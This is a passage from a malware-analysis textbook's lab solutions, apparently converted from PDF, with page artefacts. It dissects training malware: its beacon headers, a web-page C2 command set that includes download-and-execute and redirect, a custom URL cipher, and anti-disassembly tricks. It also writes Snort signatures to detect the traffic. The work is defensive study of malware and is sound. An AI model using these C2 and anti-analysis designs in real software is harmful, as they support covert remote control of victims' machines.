- en: We begin by identifying the networking functions used by the malware.
  prefs: []
  type: TYPE_NORMAL
- en: 'Looking at the imports, we see functions from two libraries: WinINet and COM.
    The functions used include InternetOpenA, InternetOpenUrlA, InternetCloseHandle,
    and InternetReadFile.'
  prefs: []
  type: TYPE_NORMAL
- en: Starting with the WinINet functions, navigate to the function containing InternetOpenUrlA
    at 0x004011F3\. Notice that there are some static strings in the code leading
    up to InternetOpenA as shown in Listing 14-5L.
  prefs: []
  type: TYPE_NORMAL
- en: '"Accept: */*\nAccept-Language: en-US\nUA-CPU: x86\nAccept-Encoding: gzip, deflate"'
  prefs: []
  type: TYPE_NORMAL
- en: '"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR'
  prefs: []
  type: TYPE_NORMAL
- en: 3.0.4506.2152; .NET CLR 3.5.30729)"
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 14-5L: Static strings used in beacon*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**639**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: These strings agree with the strings in the initial beacon. At first glance,
    they appear to be fairly common, but the combination of elements may actually
    be rare. By writing a signature that looks for a specific combination of headers,
    you can get a sense of exactly how rare the combination is based on how many times
    the signature is triggered.
  prefs: []
  type: TYPE_NORMAL
- en: 'Take a second look at the strings in Listing 14-5L and compare them with the
    raw beacon packet at the beginning of the analysis. Do you notice the repeated
    User-Agent: User-Agent: in the beacon packet? Although it looks correct in the
    strings output, the malware author made a mistake and forgot that the InternetOpenA
    call includes the header title. This oversight will allow for an effective signature.'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s first identify the beacon content, and then we will investigate how the
    malware processes a response. We see that the networking function at 0x004011F3
    takes two parameters, only one of which is used before the InternetOpenUrlA call.
    This parameter is the URL that defines the beacon destination. The parent function
    is WinMain, which contains the primary loop with a Sleep call. Tracing the URL
    parameter backward within WinMain, we see that it is set in the function at 0x00401457,
    which contains a CreateFile call.
  prefs: []
  type: TYPE_NORMAL
- en: This function (0x00401457) references a couple of strings, including C:\\ autobat.exe
    and http://www.practicalmalwareanalysis.com/start.htm. The static URL (ending
    in *start.htm*) appears to be on a branch that represents a failure to open a
    file, suggesting that it is the fallback beaconing URL if the file does not exist.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the CreateFile function, which uses the reference to *C:\\* *autobat.exe*,
    it appears as if the ReadFile command takes a buffer as an argument that is eventually
    passed all the way back to the InternetOpenUrlA function. Thus, we can conclude
    that *autobat.exe* is a configuration file that stores the URL in plaintext.
  prefs: []
  type: TYPE_NORMAL
- en: Having identified all of the source components of the beacon, navigate back
    to the original call to identify what can happen after some content is received.
    Following the InternetReadFile call at 0x004012C7, we see another call to strstr,
    with one of the parameters being <no. This strstr function sits within two loops,
    with the outer call containing the InternetReadFile call to obtain more data,
    and the inner call containing the strstr function and a call to another function
    (0x00401000), which is called when we find the <no string, and which we can presume
    is an additional test of whether we have found the correct content. This hypothesis
    is confirmed when we examine the internal function.
  prefs: []
  type: TYPE_NORMAL
- en: Figure 14-4L shows a test of the input buffer using a chain of small connected
    blocks. The attacker has tried to disguise the string he is looking for by breaking
    the comparison into many small tests to eliminate the telltale comparison string.
    Additionally, notice that the required string (<noscript>) is mixed up in order
    to avoid producing an obvious pattern. The first three comparisons in Figure 14-4L
    are the n in position 0, the i in position 5, and the o in position 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Two large comparison blocks follow the single-byte comparisons. The first contains
    a search for the / character, as well as a string comparison (strstr) of two strings,
    both of which are passed in as arguments. With some **640**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 145](index-674_1.png)'
  prefs: []
  type: TYPE_IMG
- en: backtracking, it is clear that one of the arguments is the string that has been
    read in from the Internet, and the other is the URL that originally came from
    the configuration file. The search for the / is a backward search within the URL.
    Once found, the / is converted to a NULL to NULL-terminate the string. Essentially,
    this block is searching for the URL (minus the filename) within the returned buffer.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 14-4L: Obfuscated string comparison*'
  prefs: []
  type: TYPE_NORMAL
- en: 'The second block is a search for the static string 96'' starting at the end
    of the truncated URL. There are two paths at the bottom of the function: one representing
    a failure to find the desired characteristics and one represent-1 4'
  prefs: []
  type: TYPE_NORMAL
- en: ing success. Notice the large number of paths focused on the failure state (loc_401141).
    These paths represent an early termination of the search.
  prefs: []
  type: TYPE_NORMAL
- en: 'In summary, assuming that the default URL is being used, the filter function
    in this part of the code is looking for the following (the ellipsis after the
    noscript tag represents variable content):'
  prefs: []
  type: TYPE_NORMAL
- en: <noscript>... http://www.practicalmalwareanalysis.com *returned_content* 96'
  prefs: []
  type: TYPE_NORMAL
- en: Now, let’s shift focus to what happens with the returned content. Returning
    to WinMain, we see that the function at 0x00401684 immediately follows the Internet
    function (0x004011F3) and takes a similar parameter, which turns out to be the
    URL.
  prefs: []
  type: TYPE_NORMAL
- en: 'This is the decision function, which is confirmed by recognizing the switch
    structure that uses a jump table. Before the switch structure, strtok is used
    to divide the command content into two parts, which are put into two variables.
    The following is the disassembly that pulls the first character out of the first
    string and uses it for the switch statement:'
  prefs: []
  type: TYPE_NORMAL
- en: 004016BF mov ecx, [ebp+var_10]
  prefs: []
  type: TYPE_NORMAL
- en: 004016C2 movsx edx, byte ptr [ecx]
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**641**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 146](index-675_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 004016C5 mov [ebp+var_14], edx
  prefs: []
  type: TYPE_NORMAL
- en: 004016C8 mov eax, [ebp+var_14]
  prefs: []
  type: TYPE_NORMAL
- en: 004016CB sub eax, 'd'
  prefs: []
  type: TYPE_NORMAL
- en: Case 0 is the character 'd'. All other
  prefs: []
  type: TYPE_NORMAL
- en: cases are greater than that value by 10, 14,
  prefs: []
  type: TYPE_NORMAL
- en: and 15, which translates to 'n', 'r', and
  prefs: []
  type: TYPE_NORMAL
- en: '''s''. The ''n'' function is the easiest one to'
  prefs: []
  type: TYPE_NORMAL
- en: figure out, since it does nothing other
  prefs: []
  type: TYPE_NORMAL
- en: than set a variable that causes the main
  prefs: []
  type: TYPE_NORMAL
- en: loop to exit. The 's' function turns out to
  prefs: []
  type: TYPE_NORMAL
- en: be sleep, and it uses the second part of the
  prefs: []
  type: TYPE_NORMAL
- en: command directly as a number value for
  prefs: []
  type: TYPE_NORMAL
- en: the sleep command. The 'r' and 'd' func-
  prefs: []
  type: TYPE_NORMAL
- en: tions are related, as they both pass the sec-
  prefs: []
  type: TYPE_NORMAL
- en: ond part of the command into the same
  prefs: []
  type: TYPE_NORMAL
- en: function early in their execution, as shown
  prefs: []
  type: TYPE_NORMAL
- en: in Figure 14-5L.
  prefs: []
  type: TYPE_NORMAL
- en: The 'd' function calls both
  prefs: []
  type: TYPE_NORMAL
- en: URLDownloadToCacheFileA and CreateProcessA,
  prefs: []
  type: TYPE_NORMAL
- en: and looks very much like the code from
  prefs: []
  type: TYPE_NORMAL
- en: Lab 14-1\. The URL is provided by the out-
  prefs: []
  type: TYPE_NORMAL
- en: put of the shared function in Figure 14-5L
  prefs: []
  type: TYPE_NORMAL
- en: (0x00401147), which we can now assume
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 14-5L: Function graph*'
  prefs: []
  type: TYPE_NORMAL
- en: is some sort of decoding function. The 'r'
  prefs: []
  type: TYPE_NORMAL
- en: '*showing the connection between*'
  prefs: []
  type: TYPE_NORMAL
- en: function also uses the encoding function,
  prefs: []
  type: TYPE_NORMAL
- en: '*the ''r'' and ''d'' commands*'
  prefs: []
  type: TYPE_NORMAL
- en: and it takes the output and uses it in the
  prefs: []
  type: TYPE_NORMAL
- en: function at 0x00401372, which references CreateFile, WriteFile, and the same
    *C:\\autobat.exe* configuration file referenced earlier. From this evidence, we
    can infer that the intent of the 'r' function is to redirect the malware to a
    different beacon site by overwriting the configuration file.
  prefs: []
  type: TYPE_NORMAL
- en: 'Lastly, let’s look into the encoding function used for the redirect and download
    functions. We already know that once decoded, the contents are used as a URL.
    Examining the decoding function at 0x00401147, notice the loop in the lower-right
    corner. At the start of the loop is a call to strlen, which implies that the input
    is encoded in pieces. Examining the end of the loop, we see that before returning
    to the top, the variable containing the output (identified by its presence at
    the end of the function) is increased by one, while the source function is increased
    by two. The function takes two characters at a time from the source, turns them
    into a number (with the atoi function), and then uses that number as an index
    into the following string:'
  prefs: []
  type: TYPE_NORMAL
- en: /abcdefghijklmnopqrstuvwxyz0123456789:.
  prefs: []
  type: TYPE_NORMAL
- en: '**642**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: While this string looks somewhat similar to a Base64 string, it doesn’t have
    capital letters, and it has only 39 characters. (A URL can be adequately described
    with only lowercase letters.) Given our understanding of the algorithm, let’s
    encode the default URL for the malware with the encoding shown in Figure 14-6L.
  prefs: []
  type: TYPE_NORMAL
- en: '**h**'
  prefs: []
  type: TYPE_NORMAL
- en: '**t**'
  prefs: []
  type: TYPE_NORMAL
- en: '**t**'
  prefs: []
  type: TYPE_NORMAL
- en: '**p**'
  prefs: []
  type: TYPE_NORMAL
- en: '**:**'
  prefs: []
  type: TYPE_NORMAL
- en: '**/**'
  prefs: []
  type: TYPE_NORMAL
- en: '**/**'
  prefs: []
  type: TYPE_NORMAL
- en: '**w w w**'
  prefs: []
  type: TYPE_NORMAL
- en: '**.**'
  prefs: []
  type: TYPE_NORMAL
- en: '**p**'
  prefs: []
  type: TYPE_NORMAL
- en: '**r**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**c**'
  prefs: []
  type: TYPE_NORMAL
- en: '**t**'
  prefs: []
  type: TYPE_NORMAL
- en: '**i**'
  prefs: []
  type: TYPE_NORMAL
- en: '**c**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**l**'
  prefs: []
  type: TYPE_NORMAL
- en: 08 20 20 16 37 00 00 23 23 23 38 16 18 01 03 20 09 03 01 12
  prefs: []
  type: TYPE_NORMAL
- en: '**m**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**l**'
  prefs: []
  type: TYPE_NORMAL
- en: '**w**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**r**'
  prefs: []
  type: TYPE_NORMAL
- en: '**e**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**n**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**l**'
  prefs: []
  type: TYPE_NORMAL
- en: '**y**'
  prefs: []
  type: TYPE_NORMAL
- en: '**s**'
  prefs: []
  type: TYPE_NORMAL
- en: '**i**'
  prefs: []
  type: TYPE_NORMAL
- en: '**s**'
  prefs: []
  type: TYPE_NORMAL
- en: '**.**'
  prefs: []
  type: TYPE_NORMAL
- en: '**c**'
  prefs: []
  type: TYPE_NORMAL
- en: '**o**'
  prefs: []
  type: TYPE_NORMAL
- en: '**m**'
  prefs: []
  type: TYPE_NORMAL
- en: '**/**'
  prefs: []
  type: TYPE_NORMAL
- en: '**s**'
  prefs: []
  type: TYPE_NORMAL
- en: '**t**'
  prefs: []
  type: TYPE_NORMAL
- en: '**a**'
  prefs: []
  type: TYPE_NORMAL
- en: '**r**'
  prefs: []
  type: TYPE_NORMAL
- en: '**t**'
  prefs: []
  type: TYPE_NORMAL
- en: '**.**'
  prefs: []
  type: TYPE_NORMAL
- en: '**h**'
  prefs: []
  type: TYPE_NORMAL
- en: '**t**'
  prefs: []
  type: TYPE_NORMAL
- en: '**m**'
  prefs: []
  type: TYPE_NORMAL
- en: 13 01 12 23 01 18 05 01 14 01 12 25 19 09 19 38 03 15 13 00 19 20 01 18 20 38
    08 20 13
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 14-6L: Example encoding of default URL with custom cipher* As you can
    see, any encoding of a URL that starts with *http://* will always have the string
    08202016370000\.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, let’s use what we’ve learned to generate a suitable set of signatures
    for the malware. Overall, we have three kinds of communication: beacon packets,
    commands embedded in web pages, and a request to download and execute a file.
    Since the request to download is based entirely on the data that comes from the
    attacker, it is difficult to produce a signature for it.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Beacon**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The beacon packet has the following structure:'
  prefs: []
  type: TYPE_NORMAL
- en: GET */start.htm* HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: '**Accept: */***'
  prefs: []
  type: TYPE_NORMAL
- en: '**Accept-Language: en-US**'
  prefs: []
  type: TYPE_NORMAL
- en: '**UA-CPU: x86**'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Accept-Encoding: gzip, deflate**'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: **User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;**'
  prefs: []
  type: TYPE_NORMAL
- en: '**.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: *www.practicalmalwareanalysis.com*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Cache-Control: no-cache'
  prefs: []
  type: TYPE_NORMAL
- en: The elements in italic are defined by the URL, and they can be ephemeral (though
    they should certainly be used if known). The bold elements are static and come
    from two different strings in the code (see Listing 14-5L).
  prefs: []
  type: TYPE_NORMAL
- en: 'Since the attacker made a mistake by including an extra User-Agent:, the obvious
    signature to target is the specific User-Agent string with the additional User-Agent
    header:'
  prefs: []
  type: TYPE_NORMAL
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.3.1 Specific
    User-Agent with duplicate header"; content:"User-Agent|3a20|User-Agent|3a20|
  prefs: []
  type: TYPE_NORMAL
- en: Mozilla/4.0|20|(compatible\;|20|MSIE|20|7.0\;|20|Windows|20|NT|20|5.1\;|20|
  prefs: []
  type: TYPE_NORMAL
- en: .NET|20|CLR|20|3.0.4506.2152\;|20|.NET|20|CLR|20|3.5.30729)"; http_header; sid:20001431;
    rev:1;)
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**643**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Web Commands**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The overall picture of the command provided by the web page is the following:'
  prefs: []
  type: TYPE_NORMAL
- en: <noscript>... *truncated_url*/ *cmd_char*.../ *arg* 96'
  prefs: []
  type: TYPE_NORMAL
- en: 'The malware searches for several static elements in the web page, including
    the noscript tag, the first characters of the URL ( *http://*), and the trailing
    96''. Since the parsing function that reads the *cmd_char* structure is in a different
    area of the code and may be changed independently, it should be targeted separately.
    Thus, the following is the signature for targeting just the static elements expected
    by the malware:'
  prefs: []
  type: TYPE_NORMAL
- en: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.2 Noscript
    tag with ending"; content:"<noscript>"; content:"http\://"; distance:0; within:512;
    content:"96'"; distance:0; within:512; sid:20001432; rev:1;) The other section
    of code to target is the command processing. The commands accepted by the malware
    are listed in Table 14-2L.
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 14-2L:** Malware Commands'
  prefs: []
  type: TYPE_NORMAL
- en: '**Name**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Command**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Argument**'
  prefs: []
  type: TYPE_NORMAL
- en: download
  prefs: []
  type: TYPE_NORMAL
- en: d
  prefs: []
  type: TYPE_NORMAL
- en: Encoded URL
  prefs: []
  type: TYPE_NORMAL
- en: quit
  prefs: []
  type: TYPE_NORMAL
- en: n
  prefs: []
  type: TYPE_NORMAL
- en: NA
  prefs: []
  type: TYPE_NORMAL
- en: redirect
  prefs: []
  type: TYPE_NORMAL
- en: r
  prefs: []
  type: TYPE_NORMAL
- en: Encoded URL
  prefs: []
  type: TYPE_NORMAL
- en: sleep
  prefs: []
  type: TYPE_NORMAL
- en: s
  prefs: []
  type: TYPE_NORMAL
- en: Number of seconds
  prefs: []
  type: TYPE_NORMAL
- en: 'The download and redirect functions both share the same routine to decode the
    URL (as shown in Figure 14-5L), so we will target these two commands together:'
  prefs: []
  type: TYPE_NORMAL
- en: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"PM14.3.3 Download
    or Redirect Command"; content:"/08202016370000"; pcre:"/\/[dr][^\/]*\/
  prefs: []
  type: TYPE_NORMAL
- en: 08202016370000/"; sid:20001433; rev:1;)
  prefs: []
  type: TYPE_NORMAL
- en: This signature uses the string 08202016370000, which we previously identified
    as the encoded representation of *http://*. The PCRE rule option includes this
    string and forward slashes, and the d and r that indicate the download and redirect
    commands. The \/ is an escaped forward slash, the [dr] represents either the character
    d or r, the [^\/]* matches zero or more characters that are not a forward slash,
    and the \/ is another escaped slash.
  prefs: []
  type: TYPE_NORMAL
- en: 'The quit command by itself only has one known character, which is insufficient
    to target by itself. Thus, the last command we need to target is sleep, which
    can be detected with the following signature: alert tcp $EXTERNAL_NET $HTTP_PORTS
    -> $HOME_NET any (msg:"PM14.3.4 Sleep Command"; content:"96''"; pcre:"/\/s[^\/]{0,15}\/[0-9]{2,20}96''/";
    sid:20001434; rev:1;)'
  prefs: []
  type: TYPE_NORMAL
- en: '**644**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Since there is no fixed content expression target to provide sufficient processing
    performance, we will use one element from outside the command string itself (the
    96') to achieve an efficient signature. The PCRE identifies the forward slash
    followed by an s, then between 0 and 15 characters that are not a forward slash
    ('[^\/]{0,15}), a forward slash, and then between 2 and 20 digits plus a trailing
    96'.
  prefs: []
  type: TYPE_NORMAL
- en: Note that the upper and lower bounds on the number of characters that will match
    the regular expression are not being driven by what the malware will accept. Rather,
    they are determined by a trade-off between what is reasonably expected from an
    attacker and the costs associated with an unbounded regular expression. So while
    the malware may indeed be able to accept a sleep value of more than 20 digits,
    it is doubtful that the attacker would send such a value, since that translates
    to more than 3 tril-lion years. The 15 characters for the term starting with an
    s assumes that the attacker would continue to choose a single word starting with
    s, though this value can certainly be increased if a more foolproof signature
    is needed.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 15-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: 'This program uses false conditional branches: an xor eax, eax, followed by
    jz.'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program tricks the disassembler into disassembling the opcode 0xE8, the
    first of a 5-byte call instruction, which immediately follows the jz instruction.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The false conditional branch technique is used five times in this program.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The command-line argument pdq will cause the program to print
  prefs: []
  type: TYPE_NORMAL
- en: “Good Job!”
  prefs: []
  type: TYPE_NORMAL
- en: '**1 5**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: First, we load the file into IDA Pro and scroll to the main function at address
    0x401000\. A few lines from the start of the function, memory address 0x0040100E,
    we see the first signs of anti-disassembly, as shown in Listing 15-1L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401006 83 7D 08 02 cmp dword ptr [ebp+8], 2
  prefs: []
  type: TYPE_NORMAL
- en: 0040100A 75 52 jnz short loc_40105E
  prefs: []
  type: TYPE_NORMAL
- en: 0040100C 33 C0 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040100E 74 01 jz short near ptr loc_401010+1 
  prefs: []
  type: TYPE_NORMAL
- en: '00401010'
  prefs: []
  type: TYPE_NORMAL
- en: '00401010 loc_401010: ; CODE XREF:0040100Ej 00401010 E8 8B 45 0C 8B'
  prefs: []
  type: TYPE_NORMAL
- en: call near ptr 8B4C55A0h
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-1L: jz jumping into the middle of a call instruction* As shown
    at , the jz instruction appears to be jumping into the middle of the 5-byte call
    instruction at . We must determine whether this branch will be executed.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**645**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The instruction immediately preceding this branch is xor eax, eax, which will
    always set the EAX register to zero, and thus always result in the zero flag being
    set. The jz instruction will therefore always jump at this point because the state
    of the zero flag is always known. We must alter the disassembly to show the real
    target of this jump instead of the fake call instruction that is overlapping it.
  prefs: []
  type: TYPE_NORMAL
- en: Position your cursor on line 0x00401010 and press the D key on your keyboard
    to turn the line into data, as shown in Listing 15-2L. Notice that the CODE XREF
    comment is no longer red but green, and the target of the jz instruction is no
    longer loc_401010+1 but unk_401011, as seen at .
  prefs: []
  type: TYPE_NORMAL
- en: 0040100E 74 01 jz short near ptr unk_401011 
  prefs: []
  type: TYPE_NORMAL
- en: 0040100E ; --------------------------------------------------------------
  prefs: []
  type: TYPE_NORMAL
- en: 00401010 E8 db 0E8h
  prefs: []
  type: TYPE_NORMAL
- en: 00401011 8B  unk_401011
  prefs: []
  type: TYPE_NORMAL
- en: 'db 8Bh ; ï ; CODE XREF: 0040100Ej'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-2L: Converting the call instruction from Listing 15-1L to data*
    We can now modify the real target of the jz instruction. To do so, place your
    cursor at  and press the C key on your keyboard to turn this piece of data into
    code. The instructions immediately following the listing may be out of alignment,
    so keep pressing C on each db line that follows until each instruction is followed
    immediately by another instruction with no data bytes in between.'
  prefs: []
  type: TYPE_NORMAL
- en: The same false conditional technique is found again at offset 0x0040101F.
  prefs: []
  type: TYPE_NORMAL
- en: Clean up the code at this location in the same manner to reveal another use
    of the false conditional technique at location 0x00401033\. The final remaining
    places to fix are 0x00401047 and 0x0040105E.
  prefs: []
  type: TYPE_NORMAL
- en: Once all the code is disassembled correctly, select the code from line 0x00401000
    to the retn instruction at line 0x00401077, and press the P key on your keyboard
    to force IDA Pro to turn this block of code into a function.
  prefs: []
  type: TYPE_NORMAL
- en: Once it is a function, rename the function parameters argc and argv. At this
    point, it should be clear at line 0x00401006 that the program checks to see if
    the value of argc is 2, and prints the failure string if it is not. If the value
    is 2, line 0x0040101A compares the first letter of argv[1] with p. Line 0x0040102E
  prefs: []
  type: TYPE_NORMAL
- en: then compares the third letter with q, and 0x00401042 compares the second with
    d. If all three letters are equal, the string Good Job! is printed at line 0x00401051\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 15-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The URL initially requested is *http://www.practicalmalwareanalysis.com/*
  prefs: []
  type: TYPE_NORMAL
- en: '*bamboo.html*.'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The User-Agent string is generated by adding 1 to each letter and number in
    the hostname ( *Z* and 9 are rotated to *A* and 0).
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The program looks for the string Bamboo:: in the page it requested.'
  prefs: []
  type: TYPE_NORMAL
- en: '**646**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The program searches beyond the Bamboo:: string to find an additional ::, which
    it converts to a NULL terminator. The string in between Bamboo and the terminator
    is downloaded to a file named *Account Summary.xls.exe* and executed.'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Open the binary with IDA Pro and scroll to the main function at offset 0x00401000\.
    We will begin with disarming this function by reading it top to bottom, fixing
    each countermeasure until we reach the logical end of the function. The first
    countermeasure we encounter is shown in Listing 15-3L
  prefs: []
  type: TYPE_NORMAL
- en: at address 0x0040115A.
  prefs: []
  type: TYPE_NORMAL
- en: 0040115A test esp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 0040115C jnz short near ptr loc_40115E+1 
  prefs: []
  type: TYPE_NORMAL
- en: 0040115E
  prefs: []
  type: TYPE_NORMAL
- en: '0040115E loc_40115E: ; CODE XREF: 0040115Cj 0040115E jmp near ptr 0AA11CDh
    '
  prefs: []
  type: TYPE_NORMAL
- en: 0040115E ; ----------------------------------------------------------------------
  prefs: []
  type: TYPE_NORMAL
- en: 00401163 db 6Ah
  prefs: []
  type: TYPE_NORMAL
- en: '00401164 dd 0E8006A00h, 21Ah, 5C858B50h, 50FFFEFDh, 206415FFh, 85890040h 00401164
    dd 0FFFFFD64h, 0FD64BD83h, 7400FFFFh, 0FC8D8D24h, 51FFFFFEh *Listing 15-3L: False
    conditional*'
  prefs: []
  type: TYPE_NORMAL
- en: The listing shows a false conditional used by the jnz instruction at .
  prefs: []
  type: TYPE_NORMAL
- en: The jump will always be taken because the value of ESP will always be nonzero
    at this point in the program. The ESP register is never loaded with a specific
    value, but it must be nonzero for a normal functioning Win32 application.
  prefs: []
  type: TYPE_NORMAL
- en: The target of the jump lies within the 5-byte jmp instruction at . Turn this
    instruction into data by putting your cursor at  and pressing D on the keyboard.
    Then put your cursor on the jump target line 0x0040115F and **1 5**
  prefs: []
  type: TYPE_NORMAL
- en: press C to turn the line into code.
  prefs: []
  type: TYPE_NORMAL
- en: We continue reading the code until we encounter the anti-disassembly countermeasure
    at line 0x004011D0\. This is a simple false conditional based on a jz following
    an xor eax, eax instruction. Correct this disassembly in the same fashion as in
    Lab 15-1\. Be sure to continue turning bytes into code so it reads clearly. Continue
    reading the code until you come to the next countermeasure at line 0x00401215,
    which is shown in Listing 15-4L.
  prefs: []
  type: TYPE_NORMAL
- en: '00401215 loc_401215: ; CODE XREF: loc_401215j 00401215 EB FF  jmp short near
    ptr loc_401215+1'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-4L: jmp into itself*'
  prefs: []
  type: TYPE_NORMAL
- en: At  is a 2-byte jmp instruction whose target is the second byte of itself.
  prefs: []
  type: TYPE_NORMAL
- en: The second byte is the first byte of the next instruction. Turn this instruction
    into data and put your cursor on the second byte, location 0x00401216, and turn
    it into code. To force IDA Pro to produce a clean graph, turn the first byte of
    the jmp instruction (0xEB) into a NOP. If you are using the commercial Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**647**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: version of IDA Pro, select **File****Python command**, enter **PatchByte(0x401215,**
    **0x90)** into the text box, and click **OK**. Now put your cursor on the location
    0x00401215, which should contain the value db 90h, and convert it to code by pressing
    the C key.
  prefs: []
  type: TYPE_NORMAL
- en: Continue reading the code until you reach the next countermeasure at line 0x00401269,
    which is shown in Listing 15-5L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401269 jz short near ptr loc_40126D+1 
  prefs: []
  type: TYPE_NORMAL
- en: 0040126B jnz short near ptr loc_40126D+1 
  prefs: []
  type: TYPE_NORMAL
- en: 0040126D
  prefs: []
  type: TYPE_NORMAL
- en: '0040126D loc_40126D: ; CODE XREF: 00401269j 0040126D ; 0040126Bj 0040126D call
    near ptr 0FF3C9FFFh '
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-5L: False conditionals with the same target* Listing 15-5L shows
    a false conditional based on putting both halves of a conditional branch back-to-back
    ( and ) and pointing at the same target.'
  prefs: []
  type: TYPE_NORMAL
- en: The same target for jnz and jz means that the countermeasure does not depend
    on a specific state of the zero flag as either set or unset in order to hit the
    target code. In this case, the target is in the middle of the call instruction
    on line 0x0040126D at . Convert this instruction to data by pressing the D
  prefs: []
  type: TYPE_NORMAL
- en: key on the keyboard. Then put your cursor on line 0x0040126E to convert it to
    code with the C key.
  prefs: []
  type: TYPE_NORMAL
- en: Continue reading the code until you reach the next countermeasure at line 0x004012E6,
    which is shown in Listing 15-6L.
  prefs: []
  type: TYPE_NORMAL
